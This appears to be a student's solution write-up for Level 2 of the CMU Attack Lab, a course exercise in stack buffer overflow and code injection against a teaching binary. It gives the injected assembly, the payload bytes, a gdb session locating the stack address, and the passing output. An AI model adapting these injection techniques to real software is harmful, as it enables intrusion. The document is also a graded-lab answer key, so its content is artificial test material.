# 4.2 Level 2

Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:

```C
void touch2(unsigned val)
{
vlevel = 2; /* Part of validation protocol */
if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
} else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
 }
    exit(0);
 }
```

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,
however, you must make it appear to touch2 as if you have passed your cookie as its argument.

Some Advice:
- You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.
- Recall that the first argument to a function is passed in register %rdi.
- Your injected code should set the register to your cookie, and then use a ret instruction to transfer
control to the first instruction in touch2.
- Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
control, even when you are not returning from a call.
- See the discussion in Appendix B on how to use tools to generate the byte-level representations of
instruction sequences.

# Idea
3.10.3 : the program is fed with a string that contains the byte encoding of some executable code, called the exploit code, 
plus some extra bytes that overwrite the return address with a pointer to the exploit code. 
The effect of executing the ret instruction is then to jump to the exploit code.

the exploit code is the bytes sequence machine code(hex format) start from address
68 ef cd ab 00 .... (pushq  $0xabcdef)

the program will read these bytes as sequence instructions


# Solution
1. build exploit2.s
```assembly
movq  $0x59b997fa, %rdi  # set the register %rdi (first argument) to your cookie 值 0x59b997fa
pushq 0x4017ec           # push the address of the touch2 to stack to set return address 
ret                      # when return, go to the address of the touch2 by pop from the stack
```
2. then convert exploit2.s to hex-formatted byte sequencenc then to bytes.
```shell
# assemble the assemble file(text) to object file(binary) exploit2.o
unix> gcc -c exploit2.s
# disassemble the object file(binary) to 
unix> objdump -d exploit2.o > exploit2.d

# exploit2.o:     file format elf64-x86-64

# Disassembly of section .text:

# 0000000000000000 <.text>:
#    0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
#    7:	68 ec 17 40 00       	pushq  $0x4017ec
#    c:	c3                   	retq   

# get hex-formatted byte sequencenc as instruction sequence from disassemble file exploit2.d
（低地址）48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 （高地址）
# This string can then be passed through HEX2RAW to generate an input string for the target programs..
# Alternatively, you can edit example.d to omit extraneous values and to contain C-style comments for readability, 
# yielding:
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
68 ec 17 40 00       	/* pushq  $0x4017ec */
c3                   	/* retq   */

```

3. get the rsp register address when return getbuf

```shell
gdb ctarget
```

```gdb
(gdb) b getbuf
(gdb) run -q  <raw2.txt
(gdb) disas
(gdb) n
(gdb) p $rsp 
$1 = (void *) 0x5561dc78
(gdb) info r rsp
rsp            0x5561dc78          0x5561dc78
```

0x5561dc78 to little endian
low address:  78 dc 61 55


4. add the exploit2_.d with the rsp address to exploit2_.d
(低地址)
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00                  	
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 (高地址)


getbuf stack frame should be:
00 00 00 55 61 dc 78    -> rsp 地址       
+-----------------------------+ <-- 高地址（栈底方向）
00 00 00 00 00 00 00 00                  	
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 c3 00 40 17 ec
68 59 b9 97 fa c7 c7 48
+-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）


5. convert exploit2_.d to raw format
```shell
cat exploit2_.d | ./hex2raw > raw2.txt
```


##  Run progrom with inject assemble code(exploit code) 
   
```shell
./ctarget -q < raw2.txt

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 


```

## GDB
callq getbuf function:
- inject assemble code(exploit code) in memory
- overwrite the return address on stack to the address of the start of exploit code 

ret instruction in getbuf:
- pop the return address from the stack
- set %rip to the address of the start of exploit code
- jump to the start of the exploit code

execute the exploit code
- set the register %rdi (first argument) to your cookie
- push the return address of touch2 to the stack

ret instruction in exploit code
use a ret instruction to transfer control to the first instruction in touch2
- pop the return address of touch2 from the stack
- set %rip to the address of the start of touch2
- jump to the start of touch2
  









# FAQs

1. when the program is fed with a string that contains the byte encoding of some executable code, how can we get the address for this exccutable code?

by set the return address to register rsp address

2. when overwrite the return address of getbuf function to register rsp address, the program will return to rsp address, but why then the prograom will execute the exploit code by buffer overflow?

- overwrite the return address of getbuf function to register rsp address
- ret in getbuf return to rsp address
- from rsp address read exploit code instructions( bytes )

